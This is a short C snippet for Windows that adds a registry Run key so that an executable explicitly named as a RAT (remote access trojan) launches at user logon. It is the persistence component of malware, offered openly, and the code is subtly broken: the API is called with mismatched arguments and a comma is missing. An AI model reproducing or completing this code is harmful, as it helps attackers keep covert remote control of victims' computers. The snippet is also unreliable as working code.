#include <windows.h>

void AutoStartOnBoot() {
 HKEY hKey;
 if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
 const char* appPath = "C:\\Path\\To\\Your\\RAT.exe";
 RegSetValueEx(hKey "YourRAT", 0, REG_SZ, (BYTE*)appPath, strlen(appPath) + 1);
 RegCloseKey(hKey);
 }
}
